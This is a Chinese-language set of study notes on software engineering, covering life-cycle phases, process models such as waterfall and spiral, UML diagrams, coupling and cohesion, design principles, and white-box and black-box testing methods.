软件生命（存）周期\n软件生命周期：软件产品从形成概念开始，经过开发、使用和维护，直到最后退役的全过程\n分为三个时期：软件定义、软件开发和运行维护（也称为软件维护）。每个时期又进一步划分为若干个阶段\n\n\n\n\n阶段\n关键问题\n结束标准\n\n\n\n\n问题定义\n问题是什么？\n关于规模和目标的报告书\n\n\n可行性研究\n有可行的解吗？\n系统的高层逻辑模型：数据流图、成本/效益分析\n\n\n需求分析\n系统必须做什么？\n系统的逻辑模型：数据流图、数据字典、算法描述\n\n\n总体设计\n概括地说，应该如何解决这个问题？\n可能的解法：系统流程图、成本/效益分析推荐的系统结构：层次图或结构图\n\n\n详细设计\n怎样具体地实现这个系统？\n编码规格说明：HIPO图或PDL\n\n\n编码/单元测试\n正确的程序模块\n源程序清单：单元测试方案和结果\n\n\n综合测试\n符合要求的软件\n综合测试方案和结果：完整一致的软件配置\n\n\n维护\n持久地满足用户需要的软件\n完整准确的维护记录\n\n\n\n\n例：教材销售系统\n学生购买学校教材的手续可能是：\n\n学生自己写一个希望买什么书的列表，先找系办公室开购书申请（用于确定学生可购买的书，希望用软件实现，完全由教材科控制）\n凭申请找教材科开购书证明（确定是否卖完，希望用计算机实现）\n向财务交付书款获得领书单，然后到书库找保管员领书\n\n\n关于系统规模和目标的报告书\n\n\n项目名称：教材销售系统\n\n\n问题：人工发售教材手续繁杂，且易出错\n\n\n项目目标：建立一个高效率、无差错的教材销售系统\n\n\n项目规模：利用现有计算机，软件开发费用不超过5000元\n\n\n初步想法：验证学生可买什么书\n​\t建议在系统中增加对缺书的统计与采购功能\n\n\n可行性研究：建议进行大约10天的可行性研究，研究费用不超过500元\n\n\n\n\n\n软件维护\n\n\n任务：使系统持久地满足用户的需要\n\n改正性维护，诊断和改正在使用过程中发现的软件错误\n适应性维护，修改软件以适应环境的变化\n完善性维护，根据用户的要求改进或扩充软件，工作量最大\n预防性维护，修改软件为将来的维护活动做准备\n\n每一项维护活动实质上是经历了一次压缩和简化了的软件定义和开发的全过程\n\n\n结果：完整准确的维护记录\n\n\n\n\n 软件工程方法\n\n 软件过程模型\n 瀑布模型\n传统的瀑布模型\n\n\n计划：时间计划、成本计划、人力资源计划等\n\n实际的瀑布模型\n\n\n后续阶段发现前面阶段的错误，使用反馈环返回修改\n\n\n特点：\n\n\n阶段间具有顺序性和依赖性，不允许同时进行\n\n前一阶段的工作完成之后，才能开始后一阶段的工作\n前一阶段的输出文档就是后一阶段的输入文档\n\n\n推迟实现的观点\n\n对于规模较大的软件项目来说，往往编码开始得越早最终完成开发工作所需要的时间反而越长\n\n\n质量保证的观点\n\n每个阶段都必须完成规定的文档，是“文档驱动”的模型\n每个阶段结束前都要对所完成的文档进行评审，尽早发现问题，改正错误\n\n\n\n\n\n优点：\n\n强迫开发人员采用规范的方法\n严格地规定了每个阶段必须提交的文档\n要求每个阶段交出的所有产品都必须经过质量保证小组的仔细验证\n\n\n\n缺点：\n\n客户要准确、完整、全部的表达出自己的要求\n缺乏灵活性。一旦需求存在偏差，最终只能终止或者失败（偏差随着系统推进，层层放大，失之毫厘谬以千里）\n用户只能通过文档了解产品，不经过实践的需求时不切实际的\n\n\n\n适合瀑布模型的项目特征\n\n需求：预知，需求明确\n方案：技术、方法、框架，方案成熟明确\n类似项目：小型项目\n\n\n\n V模型\n强调了测试在软件开发过程中的重要性\n\n\n适合V模型的项目特征\n\n需求：很明确\n方案：很明确\n类似项目：系统性能、安全有严格要求等\n\n\n\n 增量模型\n增量模型把软件产品作为一系列的增量构件来设计、编码、集成和测试\n\n\n特点：\n\n该模型假设需求是可以分段的，称为一系列增量产品，每一增量可以单独开发\n比如，使用增量模型开发字处理软件时：\n​\t第一个增量构件往往提供软件的基本需求，提供最核心本的文件管理、编辑和文档生成功能。例输入、插入、新建、存储\n​\t第二个增量构件提供更完善的编辑和文档生成功能，比如菜单，复制、粘贴、另存为等\n​\t第三个增量构件实现拼写和语法检查功能\n​\t第四个增量构件完成高级的页面排版功能\n\n优点：\n\n作为瀑布模型的变体，拥有瀑布模型的全部优点\n第一个可以交付的版本所需要的成本和时间少，迅速占领市场\n承担的风险小\n当配备的人员有限，不能在设定的期限内完成产品时，可以提供先推出核心产品的途径\n逐步增加产品功能可以使用户有较充裕的时间学习和适应新产品\n\n\n难点：\n\n软件体系结构必须是开放的\n如果分增量块过多的话，会增加管理成本\n不同的构件并行地构建有可能加快工程进度冒无法集成到一起的风险\n\n\n\n\n增量模型整体以瀑布模型为基准，对瀑布模型的拓展。在概要设计完成后，使用增量模型，分模块进行增量组件的开发。增量组件称为构件，方便软件复用\n\n\n适合增量模型的项目特征\n\n需求：需求会变动\n方案：对完成期限有严格要求，开发早期阶段获得投资回报，对于市场和用户把握需要逐步了解进行已有产品升级或新版本开发非常合适\n类似项目：适用于商业软件的开发\n\n\n\n\n实例\n微软“同步—稳定的产品开发模型”\n\n将项目分成若干个里程碑\n定义稳定、灵活的体系结构，并为构件和子系统的开发提供统一的接口\n开发构件，维持一个可发布的系统版本\n\n可以准确把握项目进展情况\n增强开发人员的信心和成就感\n可以随时根据市场情况及时作出调整\n\n 快速原型模型\n第一步是快速的建立一个能反应用户主要需求的原型系统，让用户在计算机上试用它，通过实践来了解目标系统的概貌\n\n\n\n步骤\n\n\n获取用户需求，描述规格说明书\n使用原型（样本）思想获取用户需求\n\n原型也可能是公司现有的一个类似软件，或只是界面，或只是文档。可能是最终产品能完成的功能的一个子集\n一旦原型完全符合用户需求，开发人员根据其写说明书\n\n\n\n根据规格说明书开发维护软件\n\n\n\n\n特点：\n\n软件产品的开发基本上是线性顺序进行的\n快速原型的本质是“快速”。应该尽可能快地建造出原型系统，以加速软件开发过程，节约成本\n在整个开发过程中，初始及多次迭代的原型可能跟用户的需求完全不同，引起客户不满。但同时用户也能随时看到实物和进展\n\n\n\n适合快速原型模型的项目特征\n\n需求：不明确，不能完整、准确的定义\n希望：减少项目需求的不确定性\n方案：项目很小，较简单。有快速原型开发工具或软件类似产品\n\n\n\n 螺旋模型\n增加了风险分析过程的瀑布模型和快速原型模型混合\n风险分析是对工程建设项目投资决策或企业生产经营决策可能造成的失误和带来的经济损失所进行的估计\n\n特点：\n\n每完成一项任务，都要先进行风险识别，然后风险分析，对存在的风险尽力进行风险控制。若风险很大，无法解决，甚至可以停止工作的进行\n\n图中的四个象限代表了以下活动：\n\n制定计划：确定软件目标，选定实施方案，弄清项目开发的限制条件；（左上）\n风险分析：分析评估所选方案，考虑如何识别和消除风险；（右上）\n实施工程：实施软件开发和验证（右下）\n客户评估：评价开发工作，提出修正建议，制定下一步计划。（左下）\n\n\n\n优点：\n\n主要优势在于它是风险驱动的。在评估和风险分析阶段都可作出项目是否继续，以规避无法承担的风险\n螺旋循环的次数指示了已消耗的资源\n对可选方案和约束条件的强调有利于已有软件的重用，也有助于把软件质量作为软件开发的一个重要目标\n减少了过多测试或测试不足所带来的风险\n维护只是模型的另一个周期，维护和开发之间没有本质区别\n\n\n\n缺点：\n\n采用螺旋模型需要具有相当丰富的风险评估经验和专门知识，在风险较大的项目开发中，如果未能够及时标识风险，势必造成重大损失\n过多的迭代次数会增加开发成本，延迟提交时间\n\n\n\n适合螺旋模型的项目特征\n\n特别适用于庞大、复杂并具有高风险的系统\n适用于内部开发的大规模软件项目\n\n\n\n 喷泉模型\n瀑布模型的一种变体，旨在解决瀑布模型中的一些缺陷，特别是对需求变更的不灵活性\n喷泉模型允许在项目的任何阶段对需求进行调整和修改，使得开发过程更加灵活\n\n\n特点：\n\n各阶段相互重叠，反映了软件过程并行性的特点\n以分析为基础，资源消耗呈塔形，在分析阶段消耗的资源最多\n反映了软件过程迭代的自然特性，从高层返回低层没有资源消耗\n强调增量式开发，它依据分析一部分就设计一部分的原则，不要求一个阶段的彻底完成。整个过程是一个迭代的逐步细化的过程\n是对象驱动的过程，对象是所有活动作用的实体，也是项目管理的基本内容\n在实现时，由于活动不同，可分为对象实现和系统实现，不但反映了系统的开发全过程，而且也反映了对象族的开发和复用的过程\n\n\n适合喷泉模型的项目特征\n\n需求可能频繁变更\n强调增量式开发（快速交付）\n\n\n\n 总结\n\n\n\n模型名称\n技术特点\n适用范围\n\n\n\n\n瀑布模型\n简单，分阶段，阶段间存在因果关系，各个阶段完成后都有评审，允许反馈，不支持用户参与，要求预先确定需求\n需求易于完善定义且不易变更的软件系统\n\n\n增量模型\n软件产品是被增量式地一块块开发的，允许开发活动并行和重叠\n技术风险较大、用户需求较为稳定的软件系统\n\n\n快速原型模型\n不要求需求预先完备定义，支持用户参与，支持需求的渐进式完善和确认，能够适应用户需求的变化\n需求复杂、难以确定、动态变化的软件系统\n\n\n螺旋模型\n结合瀑布模型、快速原型模型和迭代模型的思想，并引进了风险分析活动\n需求难以获取和确定、软件开发风险较大的软件系统\n\n\n\n UML\n\nStarUML\n 二、需求分析——用例模型&amp;分析模型\n 用例模型\n\n从描述语言和视角：\n\n用例模型主要使用客户的语言进行描述，它代表了系统的外部视图。这意味着用例模型从客户的角度出发，详细描述了系统应该提供的功能和行为\n分析模型则使用开发人员的语言进行描述，它提供了系统的内部视图。分析模型更注重于系统的内部结构和实现细节，帮助开发人员理解如何构建系统\n\n从构造方式和结构：\n\n用例模型是通过用例来构造的，这些用例提供了外部视图的结构。每个用例都描述了一个特定的系统行为或功能，以及与之相关的输入、输出和前置后置条件\n分析模型则是通过构造型的类或包来构造的，这些类或包提供了内部视图的结构。分析模型更关注于系统的组件、接口和交互关系，以支持系统的设计和实现\n\n用途也存在差异：\n\n用例模型主要用于客户和开发人员之间签订合同时明确系统应该和不应该做什么\n分析模型则主要为开发人员所用，以帮助他们理解如何构造系统，即怎样设计和实现系统\n 用例图\n\n组成\n\n参与者（活动者，Actor）\n用例（Use Case）\n关系（Relationship）\n\n\n\n关系类型\n说明\n表示符号\n\n\n\n\n关联\n参与者和用例间的关系，调用了（参与者要使用系统的功能）\n\n\n\n泛化（继承）\n表示两个类之间的继承关系，其中一个类是另一个类的特殊情况。\n\n\n\n包含\n表示一个用例包含了另一个用例，用于将一个用例的功能分解为多个较小的、更具体的用例。\n\n\n\n拓展\n表示一个用例在某些条件下可以扩展另一个用例的行为，用于描述用例之间的可选行为。\n\n\n\n\n\n关联——调用本身\n\n参与者和用例间的关系\n\n泛化（继承）——“is a…”\n\n参与者之间或用例之间\n\n包含（Include）——“has a…”\n\n用例之间的关系\n箭头指向分解出来的功能用例\n箭头出发的用例为基用例。包含用例是必选的，如果缺少包含用例，基用例就不完整。\n\n拓展——特殊情况\n\n用例之间的关系\n箭头指向基础用例\n 用例文档\n\n\n用例描述文档组成：\n\n用例名称：与用例图同，并写相应编号\n简要说明/描述：简要描述功能\n优先级：标识软件客户对该用例实现状况的期许（满意度1-5、不满意度1-5），数字越大，优先级越高\n参与者（执行者）：使用该用例的人或系统等\n前置条件：在用例启动时参与者（actor）与系统应置于什么状态。此状态是系统可识别的\n后置条件：用例结束时系统应置于什么状态。即用例结束时的系统状态或持久数据情况\n\n\n\n基本事件流：对用例中常规、预期路径的描述。由若干步骤构成一个完整的交互过程\n\n使用主动语句，以执行者或系统为主语\n不涉及到界面细节\n使用业务语言，而不使用专业术语\n\n\n\n异常事件流：对用例执行中一些异常情况进行描述\n\n\n业务规则：用例执行中与业务有关的一些规则要求\n\n\n扩展点：包含用例或扩展用例，此处写出用例名\n\n\n涉及的业务实体：建立了对象模型后完善\n\n\n用例图示例：\n\n 活动图\n\n组成\n\n初始节点和终点\n活动节点\n转换\n决策与分支、合并\n分岔与汇合\n对象流（可选）\n泳道（可选）\n\n\n初始节点：\n\n\n\n终点：\n\n\n\n活动节点：表示一个活动，一个活动表示一个或多个动作的集合\n\n\n\n转换：\n\n\n\n决策与分支、合并：分支之间是互斥的\n\n\n\n分岔：表示一个控制流被两个或多个控制流代替，经过分岔后，这些控制流是并发进行的\n\n\n\n汇合：与分岔相反，表示两个或多个控制流被一个控制流代替\n\n\n\n对象流：活动和对象之间的关系\n\n\n\n泳道：活动的负责者\n\n\n活动图示例：\n\n带泳道和对象流的活动图示例：\n\n 分析模型\n 类图\n\n类\n\n\n命名\n简单名：Order\n路径名：java::awt::Rectanget\n​\t\tbusinessRule::Order\n​\t\t包名::类名\n属性\n属性名的第一个字母小写\n[可见性] 属性名 [:类型] [=初始值] [{特性}]\na:int\npublic(+)：即模型中的任何类都可以访问该属性\nprivate(-)：表示不能被别的类访问\nprotected(#)：表示该属性只能被该类及其子类访问\nPackage(~)：这个类只能由同一包中的其他类访问\n\n\n组成\n\n类\n接口\n关系\n注释\n约束\n包\n\n接口：包含抽象方法的声明，但不包含具体实现。接口可以实现多态\n\n\n\n\n关系：类和类之间的线就是关系\n\n\n注释：文档不在正式程序中，只做注释说明\n\n\n约束：{}包含，定义关系约束或者类约束\n\n\n包：用于逻辑上将复杂的类图模块化，从而更好地组织和理解代码结构。通过将功能和结构相似的类放入同一个包内，可以使得整个系统的结构更加清晰和易于理解\n\n\n\n\n\n关系\n\n关联（普通关联、同类对象角色关联、限定关联）：表现在代码实现中，一个对象会作为另一个对象的属性\n聚集（聚合、组合）：关联的一种特殊情况。聚集表示类与类之间的关系是整体与部分的关系\n依赖\n\n依赖关系不会增加属性\n\n泛化\n实现\n\n\n普通关联：表明两个类之间存在某种形式的交互或依赖\n\n\n多重性：某个类的对象可以和其他类的多个对象联系\n1对1：学生和学生证\n1对多：一个学院有多名学生\n多对多：一个学生可以选择多门课，一门课也有多名学生\n固定值（1）\n无限定的多个（*）\n一个取值范围：0…1，1…*，0…*，2…5\n\n\n\n自反关联：表示类与自身的关联，即同类不同对象间的联系\n\n\n\n限定关联：利用限定词把一对多关系简化成了一对一关系\n\n\n\n关联类：为了说明关联的性质可能需要一些附加信息。这些信息放到关联的任一方都不合适，可以引入一个关联类来记录这些信息关联类与一般的类一样，也有属性、操作和关联\n\n\n\n聚合：处于部分方的对象可同时参与多个处于整体方对象的构成（弱）\n\n\n\n组合：如果部分类完全隶属于整体类，部分与整体共存，整体不存在了部分也会随之消失（强）\n\n\n\n依赖：描述两个类之间的使用关系，两个类之间是没有关系的，但是一个类的实现需要另一个类的协助，这就产生了依赖\n\n依赖关系的代码表现：\n局部变量、方法参数、对静态方法的调用\n\n\n关联是很稳定的关系，依赖是弱关系。\n表现在代码实现中，一个对象会作为另一个对象的属性是关联\n一个对象的实现用到另一个对象的方法是依赖\n\n关联有可能是双向关系\n依赖不可能是双向关系\n\n\n泛化：就是通常所说的继承关系，泛化针对类型而不针对实例，通常包含类与类之间的继承关系和类与接口实现关系\n\n\n没有具体对象的类称为抽象类，一般作为父类，用于描述其他类（子类）的公共属性和行为。在类名、操作下方附加一个标记值**{abstract}**表示，也可用斜体表示类名称和属性、方法\n\n\n\n实现：对应于类和接口之间的关系\n\n\n总结\n两个类之间，分析是否为泛化、实现、依赖。\n如果不是，分析是否是聚合、组合。\n如果不是，考虑是否存在关联类、自身关联。\n如果不是，为普通关联。\n类图示例：\n\n 名词识别法构建类图\n\n\n人员：系统需要保存或管理其信息的人员，或在系统中中扮演一定角色的人员\n\n\n组织：在系统中发挥一定作用的组织机构\n\n\n物品：需要由系统管理的各种物品，包括无形事物\n\n\n设备：在系统中被使用或由系统进行监控的设备、仪器等，系统运行中的硬件设备（如打印机）除外。\n\n\n事件：需要由系统长期记忆的事件\n\n\n\n从文档中寻找类（名词）\n确定类之间的关系\n确定操作（动词）\n精化类和类间的关系；绘制类图\n\n 顺序图\n\n组成\n\n对象–Object\n生命线–Lifeline\n控制焦点（激活）–Activation\n消息–Message\n\n\n对象：通常将发起交互的对象放在左边，将接收消息的对象放在右边。\n\n\n生命线：表示对象存在的时间，如果对象生命期结束，则用注销符号表示\n\n\n\n\n\n控制焦点（激活期）：生命线下方的矩形框，表示一个控制焦点，表示对象在现在要产生一个交互活动，发消息或者调用\n\n\n调用消息（同步消息）：必须得到回应才能进行下一项操作\n\n\n发送消息（异步消息）：只关注消息发送，不关注消息反馈，在发送后继续自己的操作\n\n\n返回消息（虚线表示）：表示消息的返回。一般同步的返回不需画出，直接隐含，也可使用返回消息强调返回结果值。异步返回需要返回消息\n\n\n\n\n顺序图示例：\n\n补充\n\n\n消息编号\n\n\n顺序编号：在每个消息的前面加上一个用冒号隔开的顺序号来表示其顺序\n\n\n\n嵌套编号：把属于同一个对象发送和接收的消息放在同一层进行编号\n\n\n\n\n\n选择、循环表示\n交互片段可以用于描述系统中不同组件或对象之间的交互流程\n\n\n表示分支的操作符\nalt:支持多条件\nopt:支持单条件\n\n\n表示循环的操作符：loop\n\n\n\n\n 分析类\n\n边界类：处理系统环境和系统内部间的通信\n\n用户界面类\n系统/设备接口类\n\n\n\n\n\n控制类：定义控制逻辑和事务逻辑\n\n\n\n实体类：记录系统所需要维护的数据和对这些数据的处理行为\n\n\n 状态图\n\n组成\n\n初态\n终态\n中间状态\n转换线\n事件（信号事件：异步、调用事件：同步、变化事件、时间事件）\n\n初态\n\n\n\n终态\n\n\n\n\n中间状态：用圆角矩形表示，分成上、中、下3部分：\n\n\n上面部分-----为状态的名称；\n\n\n中间部分-----为状态下关键变量的名字和值（可无）\n\n\n下面部分-----是活动表：当前状态下需要做的一些事情，不会改变状态（可无）\n\n\n\n\n\n活动表的语法格式：\n事件名（参数表）/动作表达式\n\n常用的3种标准事件：\nentry事件指定进入该状态的动作；\nexit事件指定退出该状态的动作；\ndo事件则指定在该状态下的动作。\n\n事件表达式的语法：\n事件说明［守卫条件］／动作表达式\n\n守卫条件是一个布尔表达式。如果同时使用事件说明和守卫条件，则当且仅当事件发生且布尔表达式为真时，状态转换才发生。如果只有守卫条件没有事件说明，则只要守卫条件为真状态转换就发生\n事件说明和［守卫条件］至少写一个，动作表达式可以没有\n\n\n信号事件：异步\n\n\n\n变化事件：用关键字When，后面跟布尔表达式\n\n\n\n时间事件：用关键字After\n\n\n状态图示例:\n\n 总结\n\n 三、概要设计\n架构设计——系统分成几个层次，采用什么样的体系架构\n模块设计——每个层次应该包括那些模块构成，需要创建哪些功能模块\n接口设计——模块之间的关系如何，如何进行信息传递\n数据设计——数据结构如何，通过最底层的数据库对整个程序功能进行支撑\n\n 模块设计的原理——模块化\n评价标准：耦合度、内聚度\n\n耦合：如果改变程序中的一个模块，要求另一个模块也同时发生改变，就认为这两个模块发生了耦合\n内聚：衡量一个模块内部各个元素（属性、方法）彼此结合的紧密程度。内聚要高，每个模块完成一个相对独立的特定子功能\n\n低耦合、高内聚\n 耦合度\n\n非直接耦合/完全独立（no direct coupling）\n\n\n\n不可能存在\n\n\n数据耦合（data coupling）\n\n两模块间通过参数交换信息，且交换的信息仅是数据\n\n维护更容易，对一个模块的修改不会使另一个模块产生退化错误\n\n控制耦合（control coupling）\n\n两个模块彼此间传递的信息中有控制信息\n\n\n模块B种存在if语句，并且判断条件和A相关。\n控制耦合多进行解耦，一般会在业务层根据控制条件，调用不同的类。\n\n控制耦合往往是多余的，把模块适当分解之后通常可以用数据耦合代替它\n被调用的模块需知道调用模块的内部结构和逻辑，降低了重用的可能性\n\n特征耦合（stamp coupling）\n\n把整个数据结构作为参数传递而被调用的模块只需要使用其中一部分数据元素\n\n公共环境耦合（common coupling）\n\n一个模块往公共环境送数据，另一个模块从公共环境取数据。即允许一组模块访问同一全局性的数据结构\n\n\n内容耦合（content coupling）\n\n最高程度的耦合，有下列情况即内容耦合：\n\n\n一个模块访问另一个模块的内部数据\n\n\n一个模块不通过正常入口转到另一个模块的内部；如使用goto\n\n\n两个模块有一部分程序代码重叠\n\n\n一个模块有多个入口\n\n\n\n\n数据耦合传参\n控制耦合通过if语句\n特征耦合给一堆数据，只用一个\n公共环境耦合大家都用公共数据\n内容耦合，代码互相夹杂\n\n 内聚度\n\n偶然内聚（coincidental cohesion）\n\n模块的各成分之间毫无关系；或发现一组语句在两处或多处出现，于是把这些语句作为一个模块以节省内存\n\n评价\n\n模块内各元素之间没有实质性联系，很可能在一种应用场合需要修改这个模块，在另一种应用场合又不允许这种修改，从而陷入困境\n可理解性差，可维护性产生退化\n模块是不可重用的\n\n逻辑内聚（logical cohesion）\n\n一个模块完成的任务在逻辑上属于相同或相似的一类\n\n评价\n\n接口难以理解，造成整体上不易理解\n完成多个操作的代码互相纠缠在一起，即使局部功能的修改有时也会影响全局，导致严重的维护问题\n难以重用\n\n解决方案\n\n模块分解\n\n时间内聚（temporal cohesion）\n\n模块包含的任务必须在同一段时间内执行\n\n评价\n\n时间关系在一定程度上反映了程序某些实质，所以时间内聚比逻辑内聚好一些\n模块内操作之间的关系很弱，与其他模块的操作却有很强的关联\n时间内聚的模块不太可能重用\n\n过程内聚（procedural cohesion）\n\n模块内的处理元素是相关的，而且必须以特定次序执行，特定次序是人为赋予的\n\n评价：\n\n比时间内聚好，至少操作之间是过程关联的\n仍是弱连接，不太可能重用模块\n\n通信内聚（communicational cohesion）\n\n模块中所有元素都使用同一个输入数据和（或）产生同一个输出数据，即在同一个数据结构上操作\n\n评价\n\n模块中各操作紧密相连，比过程内聚更好。\n不能重用\n\n解决方案\n\n分成多个模块，每个模块执行一个操作\n\n顺序内聚（sequential cohesion）\n\n模块的各个成分和同一个功能密切相关，而且这些处理必须顺序执行（一个成分的输出作为另一个成分的输入）\n\n功能内聚（functional cohesion）\n\n模块内所有处理元素（每个处理都是必不可少）属于一个整体，完成一个单一的功能\n\n评价\n\n模块可重用，应尽可能重用\n可隔离错误，维护更容易\n扩充产品功能时更容易\n\n顺序内聚，根据需求可有也可以拆\n通信内聚，对同一个数据结构做操作\n过程内聚，人为限定执行顺序\n时间内聚，同一时间段完成的没什么关系的多个任务\n逻辑内聚，逻辑控制语句来决定那部分操作。和控制耦合对应。一般进行拆模块\n偶然内聚，完全没关系，一般不用\n\n 设计原则\n\nLiskov替换原则（LSP）\n\n任何基类可以出现的地方，子类一定可以出现\n另一种表达方式：子类不能添加任何基类没有的附加约束\n\n这些约束很可能造成使用者无法通过子类正常的使用针对基类的程序\n\n实际操作中，基类往往就是抽象类（行为没有任何实现），甚至是接口\n\n\n开放-封闭原则（OCP）\n\n软件中的对象（类，模块，函数等等）应该对于扩展是开放的，但是对于修改是封闭的。是最重要的，核心设计原则\n核心思想：是对抽象编程，因为抽象相对稳定\n\n\n单一职责原则（SRP）\n\n一个类被改变的原因不能超过一个，也就是说一个类只有一个职责\n\n\n接口隔离原则（ISP）\n\n客户端不应该依赖它不需要的接口；一个类对另一个类的依赖应该建立在最小的接口上\n\n\n依赖倒置原则（DIP）\n\n高层模块不应该依赖低层模块，二者都应该依赖其抽象；抽象不应该依赖细节，细节应该依赖抽象\n高层将服务声明写入抽象层中，底层根据所能实现的服务，就和按个抽象层发生关联。这样割断了高层和底层之间的直接依赖关系，抽象成为整个系统中最稳定的部分\n\n组合/聚合原则：尽量多用聚合方式，少用泛化关系\n 架构设计\n\n\n软件架构\n一系列相关的抽象，用于指导大型软件系统各方面的设计，是一个系统的草图\n\n主机结构：一台主机多个终端\nC/S（客户机/服务器）\nB/S（浏览器/服务器）：演化出多层架构，都是基于MVC模式\nSOA：面向服务的结构\n云架构\n\n\n\n 小型图书资料管理系统-架构设计\n\nBo，存放各种业务处理类和实体类的操作\nPo，存放各种实体类，只含set和get方法，用来创建对象，不对其做任何操作，在使用时传出\nDb，处理和数据库打交道的方法\nDTO，从Db类获取的数据，封装成对象，交给DTO，将来返回给控制层\n定义架构后，开始的概要设计包括：\n\n\n问题域子系统的设计（PDC）（重点）\n面向对象设计仅需从实现角度对问题域模型做一些补充或修改，主要是增添、合并或分解类与对象、属性及服务，调整继承关系等等。（基于使用的框架、设计原则和设计模式）\n结果表现形式：实现阶段的对象模型——类图\n辅助以相关文档，描述每个类的职责，类的属性，类的服务（服务的参数，服务的功能）\n\n\n人机交互部分的设计（HIC）（重点）\n是OOD模型的外围组成部分\n确定人机交互的细节，其中包括指定窗口和报表的形式、设计命令层次等项内容\n\n\n数据部分的设计（DMC）\n\n\n 边界类\n用于描述外部参与者与系统之间的交互\n\n\n用户界面类：用户和系统进行通信\n\n\n系统接口类：该系统和其他软件系统进行通信\n\n\n设备接口类：对硬件设备使用，如各类驱动程序\n\n\n如何标识边界类？\n每一对“用例—参与者”之间确定一个边界类\n 问题域模型设计\n对问题与结构，从实现角度做一些补充或修改，主要是增添、合并或分解类与对象、属性和服务，调整继承关系等\n\n“血”指的是domain object的model层内容\n\n\n失血模型\n\ndomain object只有属性的get set方法的纯数据类，所有的业务逻辑完全由Service层来完成的，由于没有DAO，Service直接操作数据库，进行数据持久化\n\n贫血模型\n\ndomain ojbect包含了不依赖于持久化的原子领域逻辑，而组合逻辑在Service层（常见）\n\n充血模型\n\n绝大多业务逻辑都应该被放在domain object里面，包括持久化逻辑，而Service层是很薄的一层，仅仅封装事务和少量逻辑，不和DAO层打交道\n\n贫血模型和充血模型的差别在于，领域模型是否要依赖持久层，贫血模型是不依赖的，而充血模型是依赖的\n\n\n胀血模型\n\n取消了Service层，只剩下domain object和DAO两层，在domain object的domain logic上面封装事务\n 控制类\n协调边界类和实体类\n\n每个用例都对应有一个控制类\n一个控制类可以对应多个用例\n\n 数据部分的设计（DMC）\n将类的属性映射成表的一个字段\n\n特殊情况：\n并不是类中的所有属性均是永久的。例如，发票中的“合计”属性可由计算所得而不需保存在数据库中，此时该类属性（称为派生属性）不映射\n一般地，类中的属性是单值的，但如果在类中存在多值属性，则该属性映射成多个字段\n\n\n关系到数据库的映射方法\n\n\n一对一关联\n\n两个实体分别映射两张表，两张表主键一样（或一个主键作为另一个的外码）\n\n\n一对多关联\n\n一的主键作为多的外键\n\n\n组合与聚合\n\n一的主键作为多的外键\n\n\n自身关联\n\n自身关联映射到一张表，然后定义一个父节点属性就可以表示\n\n泛化关系：将父子类关系映射为一张表，以父类id作为主键，通过类型字段区分子类，将父子类中其他属性值分别加入表中。实现从类到表的映射\n​\t缺点：里面的字段值可能为空。对空字段进行拆分。\n\n整个类层次映射为单个数据库表\n每个具体子类映射成单个数据库表\n每个类均映射为数据库表\n\n 四、详细设计\n\n模块接口：类接口输入输出数据\n\n类的详细描述，内含数据、方法及方法的参数返回值\n\n\n算法描述：对模块的实现算法设计并表述\n\n\n流程图\n\n\n判定表\n当算法中包含多重嵌套的条件选择时，判定表能够清晰地表示复杂的条件组合与应做的动作之间的对应关系\n适合：单一条件只有两种结果供选择\n由4部分组成：\n\n\n左上部列出所有条件\n\n\n左下部是所有可能做的动作\n\n\n右上部是表示各种条件组合的一个矩阵\n\n\n右下部是和每种条件组合相对应的动作\n\n\n\n\n\n\n\n数据描述：局部数据结构\n\n\n模块在运行过程中数据的输入、输出、存储和处理情况，以及模块内部对象之间的关联和交互\n\neg.假设某航空公司规定，乘客可以免费托运重量不超过30kg的行李。\n当行李重量超过30kg时，对头等舱的国内乘客超重部分每公斤收费4元，对其他舱的国内乘客超重部分每公斤收费6元。\n对外国乘客超重部分每公斤收费比国内乘客多一倍，对残疾乘客超重部分每公斤收费比正常乘客少一半。\n\n\n 五、软件项目的测试\n测试方案\n包括\n\n具体的测试目的（例如，预定要测试的具体功能）\n应该输入的测试数据\n预期的结果\n通常又把测试数据和预期的输出结果称为测试用例\n\n\n 白盒测试\n适用于对单一模块测试内部结构是否和详细设计相同\n 逻辑覆盖法\n\n语句覆盖\n\n选择足够的测试用例，使得程序中每一条可执行语句至少被执行一次\n特点：\n语句覆盖对程序的逻辑覆盖很少\n语句覆盖不能走过所有支路\n语句覆盖是很弱的逻辑覆盖标准\n\n判定覆盖\n\n不仅每个语句必须至少执行一次，而且每个判定的每种可能的结果都应该至少执行一次\n\n既然语句覆盖对逻辑不作判定，则增加内容扩充为判定覆盖\n\n\n条件覆盖\n\n不仅每个语句至少执行一次，判定表达式中的每个条件都取到各种可能的结果\n特点：\n条件覆盖通常比判定覆盖强，因为它使每个条件都取到了两个不同的结果，判定覆盖却只关心整个判定表达式的值。判定覆盖不一定包含条件覆盖，条件覆盖也不一定包含判定覆盖\n\n判定/条件覆盖\n\n使得判定表达式中的每个条件都取到各种可能的值，每个判定表达式也都取到各种可能的结果\n\n条件组合覆盖\n\n使得每个判定表达式中条件的各种可能组合都至少出现一次\n特点：\n条件组合覆盖是前述几种覆盖标准中最强的\n满足条件组合覆盖标准的测试数据，也一定满足判定覆盖、条件覆盖和判定/条件覆盖标准\n但是，条件组合覆盖标准的测试数据并不一定能使程序中的每条路径都执行到\n\n路径覆盖（了解即可）\n\n使得程序中的所有可能路径都至少被执行一次\n\n总结：\n\n\n语句覆盖发现错误能力最弱\n\n\n判定覆盖包含了语句覆盖，但它可能会使一些条件得不到测试\n\n\n条件覆盖对每一条件进行单独检查，一般情况它的检错能力较判定覆盖强，但有时达不到判定覆盖的要求\n\n\n判定/条件覆盖包含了判定覆盖和条件覆盖的要求，但实际上不一定达到条件覆盖的标准\n\n\n条件组合覆盖发现错误能力较强，凡满足其标准的测试用例，也必然满足前 4 种覆盖标准\n\n\n以上五种覆盖方法，基本上是依次增强的（除少数如：条件覆盖和判定覆盖）。随覆盖级别的提高，所需设计的测试用例数量也急剧增加，开销数量级的加大\n\n 黑盒测试\n 等价类法\n在输入数据中选择一些有代表性的数据进行测试\n\n等价类：功能相同或作用相同的一类数据\n\n\n有效等价类\n\n尽可能多地覆盖尚未被覆盖的有效等价类\n\n无效等价类\n\n使它覆盖一个而且只覆盖一个尚未被覆盖的无效等价类\n 边界值分析法\n一个用例尽量覆盖多的有效边界\n一个用例只能覆盖一个无效边界\n\n边界值：指输入等价类和输出等价类边界上的数据\n\n\n划分等价类\n找等价类的边界\n\n 